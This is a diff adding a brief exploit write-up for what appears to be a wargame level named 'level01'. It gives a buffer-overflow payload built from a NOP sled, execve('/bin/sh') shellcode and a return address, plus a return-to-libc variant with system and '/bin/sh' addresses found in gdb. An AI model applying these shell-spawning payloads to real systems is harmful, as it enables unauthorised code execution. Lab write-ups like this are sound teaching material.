@@ -1,0 +1,20 @@
+For some reason have a to do a NOP sled before injecting the shellcode, because $eip value is a bit further than the jump address specified
+
+(python -c 'print "dat_wil\n" + "\x90"* 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xbc\xd6\xff\xff"'; cat) | ~/level01
+
+
+/************/
+/* Method 2 */
+/************/
+We can pass the first prompt by giving it the expected answer: "dat_wil\n" and then overflow the second one and do a return to libc.
+
+To find the proper addresses for the return to libc, when the program is running in gdb we can do:
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+(gdb) find 0xf7e6aed0, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+$> (python -c 'print "dat_wil\n" + "\x90" * 80 + "\xd0\xae\xe6\xf7DUDE\xec\x97\xf8\xf7"';cat) | ./level01
